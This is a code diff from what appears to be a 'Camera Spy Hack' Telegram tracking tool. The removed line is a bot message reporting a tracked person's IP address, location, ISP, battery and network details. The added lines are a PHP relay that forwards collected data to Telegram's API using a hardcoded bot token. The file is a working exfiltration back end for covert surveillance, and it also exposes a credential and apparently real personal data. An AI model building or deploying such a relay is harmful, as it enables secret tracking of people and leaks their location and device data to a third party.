@@ -1,1 +1,35 @@
-{"ok":true,"result":{"message_id":108577,"from":{"id":7208257909,"is_bot":true,"first_name":"Camera Spy Hack \ud83d\udd75\u200d\u2640","username":"CameraSpyHackBot"},"chat":{"id":6942622055,"first_name":"Riad","username":"Riad6_9","type":"private"},"date":1722678846,"text":"\u2139\ufe0f Activity Tracked:\n\n\ud83c\udf10 Ip address: 104.28.240.85\n\ud83c\udf0d Location: Dhaka, Dhaka Division, Bangladesh\n\ud83d\udce1 ISP: Cloudflare, Inc.\n\ud83d\udd0d Org: Cloudflare WARP\n\n\ud83d\udcf1Device Info:\n\ud83d\udd0b Charging: No\n\ud83d\udd0c Battery Level: 67%\n\ud83c\udf10 Network Type: 4g\n\ud83d\udd52 Time Zone: Asia/Dhaka\n\n\ud83d\udc68\u200d\ud83d\udcbb Tracked on: @CameraSpyHackBot","entities":[{"offset":0,"length":20,"type":"bold"},{"offset":0,"length":20,"type":"underline"},{"offset":22,"length":14,"type":"bold"},{"offset":37,"length":13,"type":"url"},{"offset":37,"length":13,"type":"italic"},{"offset":51,"length":12,"type":"bold"},{"offset":64,"length":33,"type":"italic"},{"offset":98,"length":7,"type":"bold"},{"offset":106,"length":16,"type":"italic"},{"offset":123,"length":7,"type":"bold"},{"offset":131,"length":15,"type":"italic"},{"offset":148,"length":14,"type":"bold"},{"offset":163,"length":12,"type":"bold"},{"offset":176,"length":2,"type":"italic"},{"offset":179,"length":17,"type":"bold"},{"offset":197,"length":3,"type":"italic"},{"offset":201,"length":16,"type":"bold"},{"offset":218,"length":2,"type":"italic"},{"offset":221,"length":13,"type":"bold"},{"offset":235,"length":10,"type":"italic"},{"offset":247,"length":18,"type":"bold"},{"offset":265,"length":17,"type":"mention"},{"offset":265,"length":17,"type":"bold"}]}}
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $chatId = $_POST['chatId'] ?? null;
+    $message = $_POST['message'] ?? null;
+
+    if ($chatId && $message) {
+        $url = "https://api.telegram.org/bot7368928826:AAHaBQzLBgvNS0Fb8mVRLqwOD8a_f-U8zh8/sendMessage";
+        $data = [
+            'chat_id' => $chatId,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        ];
+
+        $options = [
+            'http' => [
+                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+                'method'  => 'POST',
+                'content' => http_build_query($data),
+            ],
+        ];
+        $context  = stream_context_create($options);
+        $result = file_get_contents($url, false, $context);
+
+        if ($result === FALSE) {
+            echo json_encode(['status' => 'error', 'message' => 'Failed to send message.']);
+        } else {
+            echo json_encode(['status' => 'success']);
+        }
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Invalid chat ID or message.']);
+    }
+} else {
+    echo json_encode(['status' => 'error', 'message' => 'Invalid request method.']);
+}
+?>
